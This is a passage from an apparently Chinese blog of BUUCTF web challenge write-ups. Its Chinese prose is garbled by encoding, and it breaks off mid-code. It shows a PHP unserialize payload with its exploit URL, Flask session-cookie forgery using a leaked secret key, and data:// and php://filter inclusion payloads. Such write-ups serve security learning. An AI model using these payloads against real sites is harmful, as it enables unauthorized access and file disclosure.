class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_valid</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__construct()å‡½æ•°æ²¡æœ‰ç”¨ï¼Œä¸å‚ä¸åºåˆ—åŒ–ä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ord() å‡½æ•°è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII å€¼ã€‚</span></span><br><span class="line"><span class="comment">// ASCIIå€¼32ä¸º2ï¼ŒASCIIå€¼125ä¸º%</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯è¿‡æ»¤æ‰protectç±»çš„æˆå‘˜,åœ¨åºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»¥%00ä½œä¸ºæ ‡è¯†ç¬¦</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ä½†æ˜¯åœ¨PHPç‰ˆæœ¬å¤§äº<span class="number">7.1</span>çš„æƒ…å†µä¸‹ï¼Œ<span class="keyword">protect</span>ç±»å’Œ<span class="keyword">public</span>ç±»æ²¡ä»€ä¹ˆå¥½æ³¨æ„çš„ï¼Œæ‰€ä»¥åœ¨æ„é€ åºåˆ—åŒ–æ—¶æ”¹ä¸º<span class="keyword">public</span>å¯ä»¥ç»•è¿‡is_validå‡½æ•°</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">process</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__destruc()å‡½æ•°ä¸»è¦æ˜¯ä¸è®©<code>op===&quot;2&quot;</code>ï¼Œä½†æ˜¯åœ¨processå‡½æ•°é‡Œopåˆè¦ä¸ºâ€œ2â€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è¿™é‡Œåˆ©ç”¨å¼ºå¼±ç±»å‹æ¯”è¾ƒï¼Œ__destruc()å‡½æ•°é‡Œopæ˜¯ä¸èƒ½ä¸º2ï¼Œä½†æ˜¯æ˜¯å¼ºç±»å‹æ¯”è¾ƒï¼Œæ˜¯å­—ç¬¦2ã€â€2â€ã€‘,æ‰€ä»¥op&#x3D;2ã€æ•°å­—2ã€‘ï¼Œå°±ç»•è¿‡è¾¾åˆ°è¯»å–flag.phpçš„ç»“æœ</p><p>äºæ˜¯æ„é€ å‡ºphpåºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileHandler</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åºåˆ—åŒ–ç»“æœ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">11</span>:<span class="string">&quot;FileHandler&quot;</span>:<span class="number">3</span>ï¼š&#123;s:<span class="number">2</span>:<span class="string">&quot;op&quot;</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:<span class="string">&quot;filename&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;content&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—®ï¼ŒF12æŸ¥çœ‹ã€æˆ–è€…æ”¹ä¸€ä¸‹filenameçš„å€¼ä¸ºphp:&#x2F;&#x2F;filterä¼ªåè®®ï¼Œç”¨base64ï¼Œå¯ä»¥ç›´æ¥çœ‹åˆ°ã€‘</p><p><code>http://f20b2545-8ff3-4a33-887f-27f4901db96a.node4.buuoj.cn:81/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code></p><p>å¾—åˆ°flag</p><p><img src="/2022/06/21/buuctf-wp/image-20220822135717175.png" alt="image-20220822135717175"></p><h2 id="7-HCTF-2018-admin"><a href="#7-HCTF-2018-admin" class="headerlink" title="7.[HCTF 2018]admin"></a>7.[HCTF 2018]admin</h2><h3 id="1-é¢˜ç›®æè¿°-4"><a href="#1-é¢˜ç›®æè¿°-4" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-4"><a href="#2-wp-4" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜å¼€å§‹å½“ä½œå¼±å¯†ç é¢˜è§£ï¼Œç»“æœç›´æ¥çˆ†ç ´å‡ºæ¥äº†</p><p>ç”¨æˆ·åï¼šadmin</p><p>å¯†ç ï¼š123</p><p>è¿™æ ·åº”è¯¥æœ€ç®€å•çš„æ–¹æ³•äº†</p><p>ä½†æˆ‘çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬wpï¼Œä»–ä»¬æŠŠè¿™ä¸ªå½“ä½œflask_sessionä¼ªé€ çš„é¢˜ç›®</p><p>å­¦ä¹ ä¸€ä¸‹</p><p>å…ˆæ³¨å†Œä¸€ä¸ªè¯•è¯•</p><p>ç”¨æˆ·åï¼šadmin123</p><p>å¯†ç ï¼š123456</p><p><img src="/2022/06/21/buuctf-wp/image-20220822203857056.png" alt="image-20220822203857056"></p><p>åªåœ¨<code>change password</code>çš„æºç çœ‹åˆ°çº¿ç´¢ï¼ŒçŸ¥é“æ˜¯flaskæ¡†æ¶</p><p><img src="/2022/06/21/buuctf-wp/image-20220822203848108.png" alt="image-20220822203848108"></p><p>è®¿é—®ä¸‹è½½æ–‡ä»¶</p><p>flaskå­˜åœ¨ä¸€ä¸ªsessionä¼ªé€ æ¼æ´</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flaskçš„<span class="keyword">session</span>ä¿å­˜åœ¨å®¢æˆ·ç«¯ï¼Œä¸€èˆ¬åªæ˜¯åŠ äº†ç­¾åæ¥é˜²æ­¢è¢«æˆªå–ä¿®æ”¹ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰åŠ å¯†æˆ‘ä»¬å°±å¯ä»¥å¯¹<span class="keyword">session</span>è¿›è¡Œè§£ç æ¥è·å–å…¶ä¸­çš„ç”¨æˆ·æ•°æ®ã€‚ </span><br><span class="line"></span><br><span class="line">å¦‚æœæˆ‘ä»¬åœ¨è·å–åˆ°ç­¾åçš„ç§˜é’¥ï¼Œå°±å¯ä»¥æŒ‰ç…§è§£ç å‡ºæ¥çš„æ•°æ®è¿›è¡Œä¼ªé€ ï¼Œé‡æ–°ç”Ÿæˆç­¾åçš„<span class="keyword">session</span>æ¥è¾¾åˆ°æ¬ºéª—æœåŠ¡ç«¯ã€‚  </span><br><span class="line"></span><br><span class="line">flaskçš„<span class="keyword">session</span>ä½¿ç”¨base64å¯¹bytesç±»å‹çš„ç”¨æˆ·æ•°æ®è¿›è¡Œç¼–ç ï¼Œè€Œä¸”ç¼–ç ä¹‹å‰å¯èƒ½è¿›è¡Œäº†å‹ç¼©(<span class="keyword">session</span>ä»¥ &quot;.&quot;  å¼€å¤´æ—¶è¡¨ç¤ºè¿›è¡Œäº†å‹ç¼©) flask ä¿å­˜åœ¨cookieé‡Œé¢çš„<span class="keyword">session</span>ä¸€èˆ¬æ ¼å¼ä¸º data.timestamp.signature</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„sessionæ²¡æœ‰åŠ å¯†ï¼Œåœ¨config.pyä¸­å¾—åˆ°äº†ç­¾åç§˜é’¥<code>ckj123</code>ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥é‡æ–°ç”Ÿæˆsessionï¼Œæ¥æ¬ºéª—æœåŠ¡å™¨</p><p><img src="/2022/06/21/buuctf-wp/image-20220822204409898.png" alt="image-20220822204409898"></p><p>åˆ©ç”¨cookie editoræŸ¥çœ‹sessionå€¼</p><p><img src="/2022/06/21/buuctf-wp/image-20220822231718091.png" alt="image-20220822231718091"></p><p>ç„¶åå†æ‰¾å‘ç°index.htmlä¸‹æœ‰flagæç¤º</p><p><img src="/2022/06/21/buuctf-wp/image-20220823000533344.png" alt="image-20220823000533344"></p><p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œå°±æ˜¯è®©sessioné‡Œçš„name&#x3D;&#x3D;â€adminâ€</p><p>æ‰€ä»¥è¿™é‡Œå°±éœ€è¦ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬å¾—åˆ°çš„session</p><p>è¿™é‡Œå»ºè®®äº†è§£ä¸€ä¸‹ä¸€ä¸ªå·¥å…·<code>flask-session-cookie-manager-master</code>èƒ½å¯¹å…¶è¿›è¡ŒåŠ å¯†è§£ç ã€å¯èƒ½éœ€è¦pipä¸‹ä¸€äº›æ¨¡å—ï¼Œç™¾åº¦å¯ä»¥è§£å†³ã€‘</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è§£å¯†</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> decode -s â€œcxk123â€ -<span class="keyword">c</span> â€œä½ åœ¨<span class="keyword">change</span>é¡µé¢çš„sessionå€¼â€</span><br><span class="line">åŠ å¯†</span><br><span class="line"><span class="keyword">python</span> flask_session_cookie_manager3.<span class="keyword">py</span> encode -s â€œcxk123â€ -t â€œæŒ‰ç…§å¾—åˆ°è§£å¯†ç»“æœæ ¼å¼æ”¹çš„ç»“æœâ€</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220822235758750.png" alt="image-20220822235758750"></p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br><span class="line"></span><br><span class="line">æŠŠæˆ‘ä»¬çš„ç”¨æˆ·åæ”¹ä¸ºadmin</span><br><span class="line"></span><br><span class="line">&#123;&#x27;_fresh&#x27;: False, &#x27;_id&#x27;: b&#x27;b83a7c28f514d37ed353fb8dd5a8febd<span class="number">8703</span>c5b8b2d40b<span class="number">535487</span>2c13dd<span class="number">4314</span>cccf<span class="number">9116</span>d2dcd<span class="number">6598</span>7e5f08b2d6cffdf72cb<span class="number">7660</span>baeb7d5e76f3ac<span class="number">2465</span>a956f03f&#x27;, &#x27;csrf_token&#x27;: b&#x27;c975b<span class="number">3523</span>4b<span class="number">704019</span>c94accb0ff54e774dcaae68&#x27;, &#x27;image&#x27;: b&#x27;cxf4&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†åŠ å¯†</p><p><img src="/2022/06/21/buuctf-wp/image-20220823000020825.png" alt="image-20220823000020825"></p><p>ç„¶åcookie editorä¿®æ”¹ä¸ºæˆ‘ä»¬åŠ å¯†ç»“æœ</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxFUMtu<span class="name">g0</span>AM_JXK<span class="number">5</span>xx<span class="number">4</span>tBekHCKRIiqtEWgJ<span class="number">8</span>l<span class="number">4</span>iGkjAy<span class="number">1</span>IJWlE<span class="number">2</span>yr<span class="number">93</span><span class="name">m1</span>bKwQd<span class="number">7</span>xvbMXOF<span class="number">4</span><span class="symbol">ntq5</span>g-hcD<span class="number">3</span><span class="meta">O7</span>gWPfQHSFp<span class="number">3</span>eIgPhiSTYsuDM<span class="meta">o956</span>KRaiq<span class="number">3</span>KJEQ<span class="number">9</span>xpFR<span class="number">-6</span>LFEDmfwZ<span class="number">7</span>c<span class="number">6</span>SPfRZkq<span class="number">4</span>qzhfi<span class="number">0</span>vF<span class="number">-528</span>sJDpuboUsmAI<span class="number">0</span>mdx_<span class="meta">o8</span>lXlaBGLl-yuBmwouVvV<span class="number">7</span>EySis-rRSkITItZF<span class="number">4</span>H<span class="number">4</span>kZjVYbus<span class="number">6</span>VKrBiTT<span class="number">1</span>L<span class="number">7</span>rl<span class="number">9</span>EQFu<span class="number">4</span>beA<span class="number">0</span>T-fj<span class="number">54</span>dux<span class="number">4</span>cFq<span class="number">0</span>OsUifFVZKGwkkTcuBMFp<span class="number">2</span>T<span class="number">0</span>otEOWvFgPbkOTkdVWWQ<span class="number">7</span>bb<span class="number">3</span>c<span class="number">72</span>pL<span class="number">-3</span>jUuhC-Ef<span class="name">G2</span>jgA<span class="number">6</span>sb<span class="number">0</span>I<span class="number">2</span>zga<span class="number">26</span><span class="symbol">ne27</span><span class="keyword">ge</span><span class="number">3</span>D<span class="number">7</span>AeD<span class="number">4</span>b<span class="number">34.</span>YwOoDA.quyfjg-Miz<span class="number">9</span>Y<span class="number">5</span>cx<span class="number">6</span>i<span class="number">5</span>hTVr<span class="number">0</span>EWjE</span><br></pre></td></tr></table></figure><p><img src="/2022/06/21/buuctf-wp/image-20220823000303547.png" alt="image-20220823000303547"></p><p>å¾—åˆ°flag</p><h2 id="8-ZJCTF-2019-NiZhuanSiWei"><a href="#8-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="8.[ZJCTF 2019]NiZhuanSiWei"></a>8.[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="1-é¢˜ç›®æè¿°-5"><a href="#1-é¢˜ç›®æè¿°-5" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p><h3 id="2-wp-5"><a href="#2-wp-5" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆåˆ†æä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)<span class="comment">//rä¸ºè¯»å–æƒé™</span></span><br></pre></td></tr></table></figure><p>file_get_contents()å‡½æ•°æ˜¯å°†æ–‡ä»¶å†…å®¹è¯»å–åˆ°å˜é‡ï¼Œè€Œè¿™é‡Œæ˜¯ä»å˜é‡è¯»å–ï¼Œè¯»å–textå˜é‡çš„å€¼ï¼Œè¿™é‡Œéœ€è¦textå˜é‡ä¸º<code>welcome to the zjctf</code></p><p>ä½†æ˜¯å› ä¸ºå¯èƒ½å­˜åœ¨å¯¹å˜é‡çš„æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤ï¼Œä¸€èˆ¬æ˜¯ç”¨base64ç»•è¿‡</p><p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨ä¸¤ä¸ªä¼ªåè®®ï¼Œphp:&#x2F;&#x2F;inputå’Œdata:&#x2F;&#x2F;ï¼Œè¿™ä¸¤ä¸ªä¸€ä¸ªæ˜¯è¯»å–postæ•°æ®ï¼Œä¸€ä¸ªæ˜¯è¯»å–getæ•°æ®ï¼Œè¿™é‡Œç”¨data:&#x2F;&#x2F;åè®®</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶è¿™é‡Œä¸ç”¨base64ä¹Ÿå¯ä»¥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ª</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨php:&#x2F;&#x2F;filterè¯»å–<code>useless.php</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;file=php:<span class="regexp">//</span>filter<span class="regexp">/read=conver.base64-encode/</span>resource=useless.php</span><br></pre></td></tr></table></figure><p>è‡³äºpasswordï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åœ¨useless.phpé‡Œæ‰æœ‰çº¿ç´¢ï¼Œå…ˆèµ‹å€¼1çœ‹çœ‹</p><p>äºæ˜¯å…ˆæ„é€ ä¸€ä¸ªpayload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=useless.php&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>useless.php</code>å†…å®¹</p><p><img src="/2022/06/21/buuctf-wp/image-20220823175723137.png" alt="image-20220823175723137"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br><span class="line"></span><br><span class="line">è§£ç å</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span 